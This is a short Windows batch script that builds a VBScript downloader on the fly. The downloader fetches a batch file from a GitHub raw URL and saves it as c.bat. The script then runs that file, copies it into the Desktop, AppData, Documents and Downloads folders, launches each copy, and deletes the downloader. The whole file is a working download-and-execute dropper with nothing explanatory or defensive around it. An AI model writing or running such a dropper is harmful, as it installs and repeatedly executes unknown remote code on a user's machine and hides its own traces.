@echo off
color 04
rem Hey! this smol chunk is from delme.
echo ' Set your settings >>downloader.vbs
echo     strFileURL = "https://raw.githubusercontent.com/Link1992md/vmtestMD/main/g.bat" >>downloader.vbs
echo     strHDLocation = "c.bat" >>downloader.vbs
echo ' Fetch the file >>downloader.vbs
echo     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>downloader.vbs
echo     objXMLHTTP.open "GET", strFileURL, false >>downloader.vbs
echo     objXMLHTTP.send() >>downloader.vbs
echo     If objXMLHTTP.Status = 200 Then >>downloader.vbs
echo       Set objADOStream = CreateObject("ADODB.Stream") >>downloader.vbs
echo       objADOStream.Open >>downloader.vbs
echo       objADOStream.Type = 1 'adTypeBinary >>downloader.vbs
echo       objADOStream.Write objXMLHTTP.ResponseBody >>downloader.vbs
echo       objADOStream.Position = 0    'Set the stream position to the start >>downloader.vbs
echo       Set objFSO = Createobject("Scripting.FileSystemObject") >>downloader.vbs
echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >>downloader.vbs
echo       Set objFSO = Nothing >>downloader.vbs
echo       objADOStream.SaveToFile strHDLocation >>downloader.vbs
echo       objADOStream.Close >>downloader.vbs
echo       Set objADOStream = Nothing >>downloader.vbs
echo     End if >>downloader.vbs
echo     Set objXMLHTTP = Nothing >>downloader.vbs
start "" downloader.vbs
rem end chunk
start c.bat
copy c.bat "%userprofile%\Desktop"
start %userprofile%\Desktop\c.bat
copy c.bat "%userprofile%\AppData"
start %userprofile%\AppData\c.bat
copy c.bat "%userprofile%\Documents"
start %userprofile%\Documents\c.bat
copy c.bat "%userprofile%\Downloads"
start %userprofile%\Downloads\c.bat
del /f /q downloader.vbs
pause
